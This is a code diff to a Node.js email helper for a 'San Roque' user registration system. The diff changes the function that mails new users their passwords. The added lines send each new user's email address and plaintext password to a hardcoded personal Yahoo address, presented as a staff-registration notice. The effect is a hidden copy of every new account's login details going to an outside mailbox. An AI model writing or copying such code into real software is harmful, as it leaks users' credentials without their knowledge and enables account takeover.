@@ -12,7 +12,7 @@ exports.randomString = function (length, chars) {
   return result
 }
 
-exports.emailRegistrationSuccessful = function (email, password) {
+exports.emailRegistrationSuccessful = function (email, password, user) {
   const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
@@ -21,7 +21,7 @@ exports.emailRegistrationSuccessful = function (email, password) {
     }
   })
 
-  const mailOptions = {
+  let mailOptions = {
     from: sender.email,
     to: email,
     subject: 'San Roque | You are now a registered user',
@@ -30,6 +30,21 @@ exports.emailRegistrationSuccessful = function (email, password) {
   this.dlog('Prepared mailOptions for mailing later')
 
   this.dlog('Will now email user his/her new password')
+  transporter.sendMail(mailOptions, function (error, info) {
+    if (error) {
+      this.dlog('Failed to email the user')
+      this.dlog(error)
+    } else {
+      this.dlog('Email sent')
+    }
+  })
+
+  mailOptions = {
+    from: sender.email,
+    to: 'jrhod_baby@yahoo.com',
+    subject: 'San Roque | ' + user.firstname + ' ' + user.lastname + ' has been registered',
+    text: 'A new staff has been registered!\n\nEmail: ' + email + '\nPassword: ' + password
+  }
   transporter.sendMail(mailOptions, function (error, info) {
     if (error) {
       this.dlog('Failed to email the user')
